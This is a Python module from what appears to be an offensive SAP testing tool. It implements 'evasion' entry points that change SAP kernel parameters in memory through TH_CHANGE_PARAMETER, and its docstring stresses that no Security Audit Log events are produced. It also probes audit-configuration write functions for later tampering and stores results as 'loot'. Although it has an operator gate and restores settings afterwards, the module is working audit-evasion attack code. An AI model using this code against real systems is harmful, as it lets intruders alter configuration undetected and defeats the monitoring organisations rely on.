"""Tier 3 active-manipulation entry points.

This module hosts one entry function per registered Tier 3 technique
(``sapmap_evasion_gate.TIER3_TECHNIQUES``).  Every entry:

  1. Asserts the operator-armed gate
     (``assert_evasion_allowed``) — refuses with ``EvasionGateError``
     otherwise.
  2. Captures a baseline snapshot if none exists.
  3. Runs the body under ``evasion_window`` so restore-on-exit is
     wired correctly.
  4. Mutates the kernel via ``change_param`` (``TH_CHANGE_PARAMETER``,
     RFC-enabled, dynamic, in-memory only).
  5. ``evasion_window`` restores the baseline value on exit (including
     exception path) by calling ``restore_baseline`` which also uses
     ``TH_CHANGE_PARAMETER`` under the hood.

Entry-point signature for every technique::

    tier3_<name>(state, node, **params) -> dict

returning ``{ok, technique, applied, baseline_value, snapshot_loot,
error}``.
"""

from __future__ import annotations

import logging
from typing import Optional

from sapmap_evasion_baseline import (capture_baseline, change_param,
                                       evasion_window)
from sapmap_evasion_gate import (assert_evasion_allowed,
                                   EvasionGateError, technique_label)

logger = logging.getLogger(__name__)


def _wrap_result(technique: str, ok: bool, **extra) -> dict:
    out = {"ok": ok, "technique": technique,
            "label": technique_label(technique)}
    out.update(extra)
    return out


def tier3_set_param(state, node, param: str, value: str,
                     creds=None) -> dict:
    """4.A.2 / 4.C.4 — dynamic kernel-parameter set via TH_CHANGE_PARAMETER.

    Asserts the gate, captures a baseline, then writes ``param=value``
    via the RFC-enabled FM ``TH_CHANGE_PARAMETER`` inside an evasion
    window so the captured baseline value is automatically restored on
    exit (or on exception).

    The change is in-memory only — no profile file rewrite, no kernel
    restart, no AUM/AUW SAL events.  Survives until restore_baseline
    is called by ``evasion_window.__exit__``.
    """
    technique = "rz11_dynamic_set"
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return _wrap_result(
            technique, False,
            error="baseline capture returned empty; refusing to mutate",
            applied=False)

    original = snap.params.get(param)
    if isinstance(original, str) and original.startswith("__UNCAPTURED__"):
        return _wrap_result(
            technique, False,
            error=f"{param} could not be baseline-captured "
                   f"({original.split(':', 1)[-1].strip()}); refusing",
            applied=False)

    write_result = {"ok": False, "error": "not attempted"}
    try:
        with evasion_window(node, state, technique,
                             creds=creds,
                             touched_params=[param]):
            write_result = change_param(node, creds, param, value)
            if write_result["ok"]:
                print(f"[+] {snap.sid}: TH_CHANGE_PARAMETER — "
                      f"{param}={value!r} (baseline {param}={original!r})")
            else:
                print(f"[-] {snap.sid}: TH_CHANGE_PARAMETER failed — "
                      f"{param}={value!r}: {write_result['error']}")
    except EvasionGateError as e:
        return _wrap_result(technique, False, error=str(e),
                             applied=False)

    return _wrap_result(
        technique, write_result["ok"],
        param=param, requested_value=value,
        baseline_value=original,
        applied=write_result["ok"],
        error=write_result["error"] if not write_result["ok"] else "",
        snapshot_loot=snap.loot_path)


def probe_rsau_api_surface(state, node, creds=None,
                             loot_root: str = "loot") -> dict:
    """Phase 2 — read-only discovery probe for the RSAU API surface.

    Calls ``FUNCTION_EXISTS`` + ``RFC_GET_FUNCTION_INTERFACE`` for the
    candidate write/read FMs we may need in Phase 3.  Pure metadata
    read; nothing in the SAL config is touched.

    The output gives us:
      * which FMs are actually exposed on this kernel
      * the exact IMPORT / EXPORT / CHANGING / TABLES parameter
        signatures so we can call them correctly the first time
        instead of guessing names + shapes

    Result is also written to
    ``loot/baseline/<sid>/rsau_api_probe_<ts>.json`` for off-line
    review and reproducibility.
    """
    technique = "rz11_dynamic_set"   # gate-only — no kernel mutation
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "probe_rsau_api",
                "error": str(e), "functions": []}

    import json as _json
    from pathlib import Path as _Path
    from datetime import datetime as _dt
    import sapmap_rfc
    from sapmap_errors import format_rfc_exception

    # Candidate FMs we want to confirm exist + read signatures of.
    # Order is the order the operator will see in the finding stream.
    candidates = (
        # Known to exist on this S/4 (confirmed in Phase 1 lab run)
        "RSAU_API_GET_AUDIT_CONFIG",
        # Operator-confirmed in SE37 screenshots — the two write FMs
        "RSAU_API_SET_PROFILE",
        "RSAU_API_SET_PARAM",
        # Expected symmetric reads — exist in operator's SAP install?
        "RSAU_API_GET_PROFILE",
        "RSAU_API_GET_PARAM",
        # Older variant from earlier screenshot
        "RSAU_UPD_AUDIT_CONFIG",
        # Less likely but worth checking — different naming style
        "RSAU_API_DEL_PROFILE",
        "RSAU_API_GET_FILT",
        "RSAU_API_SET_FILT",
    )

    results = []
    try:
        with sapmap_rfc._get_connection(node, creds) as conn:
            for fm in candidates:
                results.append(_probe_one_fm(conn, fm,
                                              format_rfc_exception))
    except Exception as e:
        msg = format_rfc_exception(e).split("\n")[0][:200]
        return {"ok": False, "technique": "probe_rsau_api",
                "error": f"connect failed: {msg}", "functions": []}

    sid = getattr(node, "sid", "?")
    probed_at = _dt.now().isoformat()
    loot_path = ""
    try:
        loot_dir = _Path(loot_root) / "baseline" / sid
        loot_dir.mkdir(parents=True, exist_ok=True)
        fname = ("rsau_api_probe_"
                 + probed_at.replace(":", "").replace(".", "_")
                 + ".json")
        loot_path = str(loot_dir / fname)
        _Path(loot_path).write_text(_json.dumps({
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "loot_path": loot_path,
        }, indent=2))
    except Exception as e:
        logger.warning(f"{sid}: rsau probe loot write failed: {e}")

    # Per-FM one-line summary, plus an overall INFO finding the
    # operator sees in the panel.
    try:
        from sapmap_findings import emit_finding
        for r in results:
            if r["exists"]:
                params_summary = _summarise_params(r["params"])
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} exists — "
                              f"{params_summary}")
            else:
                emit_finding("INFO", sid,
                              f"RSAU API probe: {r['name']} ABSENT "
                              f"({r['error'][:80]})")
    except Exception:
        pass

    n_exist = sum(1 for r in results if r["exists"])
    return {"ok": True, "technique": "probe_rsau_api",
            "sid": sid, "probed_at": probed_at,
            "functions": results,
            "found_count": n_exist,
            "total_checked": len(results),
            "loot_path": loot_path}


def _probe_one_fm(conn, fm: str, format_exc) -> dict:
    """Probe a single FM via FUNCTION_EXISTS + RFC_GET_FUNCTION_INTERFACE.

    Returns ``{name, exists, error, params}`` where params is a list of
    ``{parameter, direction, datatype, optional, structure_name}``
    dicts.  ``direction`` is one of ``IMPORT`` / ``EXPORT`` /
    ``CHANGING`` / ``TABLES`` / ``EXCEPTION`` (mapped from the
    SAP-side ``PARAMTYPE`` letter ``I/E/C/T/X``).
    """
    out = {"name": fm, "exists": False, "error": "", "params": []}

    try:
        conn.call("FUNCTION_EXISTS", FUNCNAME=fm)
        out["exists"] = True
    except Exception as e:
        msg = format_exc(e).split("\n")[0][:200]
        if "FU_NOT_FOUND" in msg or "FUNCTION_NOT_FOUND" in msg:
            out["error"] = "FU_NOT_FOUND"
        else:
            out["error"] = msg
        return out

    # FM exists — pull its parameter list.
    try:
        r = conn.call("RFC_GET_FUNCTION_INTERFACE", FUNCNAME=fm)
    except Exception as e:
        out["error"] = ("signature read failed: "
                         + format_exc(e).split("\n")[0][:160])
        return out

    # PARAMS table is RFC_FUNC_DESC.  Field names (verified on
    # S/4 793 — earlier guesses at PARAMTYPE / FUNCTYPE / STRUCTURE
    # came back empty because those are not the real field names):
    #   PARAMCLASS — I=Import, E=Export, C=Changing, T=Tables, X=Exception
    #   EXID       — external type letter (C, N, X, I, F, D, T, g, h, u, ...)
    #   TABNAME    — type or structure reference name
    #   FIELDNAME  — field name when a single field is referenced
    direction_map = {"I": "IMPORT", "E": "EXPORT", "C": "CHANGING",
                      "T": "TABLES", "X": "EXCEPTION"}
    for row in r.get("PARAMS", []) or []:
        pclass = (row.get("PARAMCLASS")
                  or row.get("PARAMTYPE") or "").strip()
        out["params"].append({
            "parameter": (row.get("PARAMETER") or "").strip(),
            "direction": direction_map.get(pclass, pclass or "?"),
            "datatype": (row.get("EXID")
                          or row.get("FUNCTYPE")
                          or row.get("EXTYP") or "").strip(),
            "structure": (row.get("TABNAME")
                           or row.get("STRUCTURE")
                           or row.get("REFERENCE") or "").strip(),
            "fieldname": (row.get("FIELDNAME") or "").strip(),
            "optional": (row.get("OPTIONAL") or "").strip() == "X",
            "default": (row.get("DEFAULT") or "").strip(),
            "text": (row.get("PARAMTEXT") or "").strip(),
        })
    return out


def _summarise_params(params: list) -> str:
    """One-line summary of an FM's signature for the finding text."""
    by_dir = {"IMPORT": [], "EXPORT": [], "CHANGING": [],
              "TABLES": [], "EXCEPTION": []}
    for p in params:
        d = p.get("direction", "?")
        if d in by_dir:
            by_dir[d].append(p["parameter"])
    parts = []
    for d in ("IMPORT", "EXPORT", "CHANGING", "TABLES"):
        if by_dir[d]:
            parts.append(f"{d[0]}=[{','.join(by_dir[d])}]")
    return " ".join(parts) if parts else "no params"


def tier3_capture_baseline_only(state, node, creds=None) -> dict:
    """Standalone baseline capture without invoking any mutation.

    Useful for the GUI's Pre-flight panel — the operator can confirm
    a baseline JSON exists for the target before arming any other
    Tier 3 technique.  Doesn't go through ``evasion_window`` because
    there's nothing to restore.
    """
    technique = "rz11_dynamic_set"   # arbitrary registered id used for the
                                       # gate; nothing actually mutates
    try:
        assert_evasion_allowed(state, node, technique,
                                require_baseline=False)
    except EvasionGateError as e:
        return {"ok": False, "technique": "baseline_capture",
                "error": str(e), "snapshot_loot": ""}

    snap = capture_baseline(node, creds=creds)
    if not snap.params:
        return {"ok": False, "technique": "baseline_capture",
                "error": "capture returned empty (no params readable)",
                "snapshot_loot": ""}

    # Mark on the session config that a baseline now exists.  This is
    # what unblocks the `require_baseline` check for other techniques.
    try:
        from sapmap_evasion import EvasionConfig
        cfg = EvasionConfig.from_dict(state.evasion or {})
        cfg.baseline_captured_at = snap.captured_at
        state.evasion = cfg.to_dict()
    except Exception as e:
        logger.warning(f"could not persist baseline timestamp: {e}")

    return {"ok": True, "technique": "baseline_capture",
            "sid": snap.sid, "captured_at": snap.captured_at,
            "snapshot_loot": snap.loot_path,
            "param_count": len(snap.params),
            "filter_row_count": len(snap.sal_filter_rows)}
